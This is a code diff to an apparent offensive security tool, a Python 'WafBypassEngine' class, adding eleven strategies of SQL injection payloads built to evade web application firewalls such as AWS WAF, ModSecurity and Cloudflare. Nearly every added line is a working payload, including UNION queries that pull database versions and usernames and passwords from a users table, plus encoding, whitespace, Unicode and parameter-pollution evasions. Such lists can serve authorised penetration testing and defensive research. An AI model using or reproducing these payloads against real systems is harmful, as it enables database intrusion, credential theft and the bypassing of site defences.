@@ -523,7 +523,83 @@ class WafBypassEngine:
                 except Exception:
                     continue
 
-        return bypasses[:30]
+        # Strategy 9: Scientific Notation (AWS WAF bypass)
+        bypasses.extend([
+            {"payload": "1e0UNION SELECT NULL,version(),NULL", "technique": "scientific_notation_bypass", "confidence": "high"},
+            {"payload": "1e0UNION SELECT NULL,@@version,NULL", "technique": "scientific_notation_mssql", "confidence": "high"},
+            {"payload": "0e0UNION SELECT NULL,version(),NULL", "technique": "scientific_notation_zero", "confidence": "medium"},
+        ])
+
+        # Strategy 10: JSON-based bypass (Claroty Team82 2022 — bypassed 5 major WAFs)
+        bypasses.extend([
+            {"payload": "' UNION SELECT JSON_ARRAYAGG(username) FROM users--", "technique": "json_array_bypass", "confidence": "medium"},
+            {"payload": "' UNION SELECT JSON_OBJECTAGG(username,password) FROM users--", "technique": "json_object_bypass", "confidence": "medium"},
+            {"payload": "' AND JSON_EXTRACT('{\"a\":1}','$.a')=1--", "technique": "json_extract_bypass", "confidence": "medium"},
+        ])
+
+        # Strategy 11: Unicode/Fullwidth Characters
+        bypasses.extend([
+            {"payload": "' \uff35\uff2e\uff29\uff2f\uff2e \uff33\uff25\uff2c\uff25\uff23\uff34 NULL--", "technique": "fullwidth_unicode_bypass", "confidence": "medium"},
+            {"payload": "' OR \uff11=\uff11--", "technique": "fullwidth_number_bypass", "confidence": "low"},
+        ])
+
+        # Strategy 12: Whitespace Alternatives
+        bypasses.extend([
+            {"payload": "'%0bOR%0b1=1--", "technique": "vertical_tab_bypass", "confidence": "high"},
+            {"payload": "'%0cOR%0c1=1--", "technique": "form_feed_bypass", "confidence": "medium"},
+            {"payload": "'%a0OR%a01=1--", "technique": "nbsp_bypass_mysql", "confidence": "medium"},
+            {"payload": "'%0dOR%0d1=1--", "technique": "cr_bypass", "confidence": "medium"},
+        ])
+
+        # Strategy 13: Backtick and No-Space Syntax (MySQL)
+        bypasses.extend([
+            {"payload": "' UNION SELECT`version()`--", "technique": "backtick_bypass", "confidence": "medium"},
+            {"payload": "'UNION(SELECT(1),(version()),(3))--", "technique": "parentheses_no_space", "confidence": "medium"},
+        ])
+
+        # Strategy 14: Double URL Encoding
+        if "double_url_encode" in profile.allowed_encodings:
+            bypasses.extend([
+                {"payload": "%2527 OR 1=1--", "technique": "double_url_encode_quote", "confidence": "high"},
+                {"payload": "%2527 UNION SELECT NULL--", "technique": "double_url_encode_union", "confidence": "high"},
+            ])
+
+        # Strategy 15: XML Entity Encoding (for XML/SOAP contexts)
+        bypasses.extend([
+            {"payload": "1 &#x55;NION &#x53;ELECT @@version", "technique": "xml_entity_bypass", "confidence": "medium"},
+            {"payload": "1&#x27; OR 1=1--", "technique": "xml_entity_quote", "confidence": "medium"},
+        ])
+
+        # Strategy 16: Function Substitutions
+        bypasses.extend([
+            {"payload": "' OR MID(version(),1,1)>'4'--", "technique": "mid_for_substring", "confidence": "medium"},
+            {"payload": "' OR ORD(MID(version(),1,1))>52--", "technique": "ord_for_ascii", "confidence": "medium"},
+            {"payload": "' OR version() LIKE '5%'--", "technique": "like_for_equals", "confidence": "medium"},
+            {"payload": "' OR version() RLIKE '^5'--", "technique": "rlike_for_equals", "confidence": "medium"},
+            {"payload": "' OR STRCMP(LEFT(version(),1),'5')=0--", "technique": "strcmp_for_equals", "confidence": "low"},
+        ])
+
+        # Strategy 17: HPP (HTTP Parameter Pollution)
+        bypasses.extend([
+            {"payload": "1&id=' OR 1=1--", "technique": "hpp_duplicate_param", "confidence": "medium"},
+            {"payload": "1/*&id=*/ OR 1=1--", "technique": "hpp_comment_split", "confidence": "low"},
+        ])
+
+        # Strategy 18: Hex Encoding
+        bypasses.extend([
+            {"payload": "' OR 0x313d31--", "technique": "hex_comparison", "confidence": "medium"},
+            {"payload": "' UNION SELECT 0x61646D696E--", "technique": "hex_string_bypass", "confidence": "medium"},
+        ])
+
+        # Strategy 19: Named WAF-Specific Bypasses
+        bypasses.extend([
+            # ModSecurity CRS
+            {"payload": "' OR {`a]b`}=1--", "technique": "modsecurity_odbc_escape", "confidence": "low"},
+            # Cloudflare-specific
+            {"payload": "' /*!OR*/ 1 /*!LIKE*/ 1--", "technique": "cloudflare_comment_like", "confidence": "low"},
+        ])
+
+        return bypasses[:60]
 
     def generate_cmdi_bypasses(self, profile: WafProfile) -> list[dict[str, str]]:
         """Generate command injection payloads that bypass the profiled WAF."""
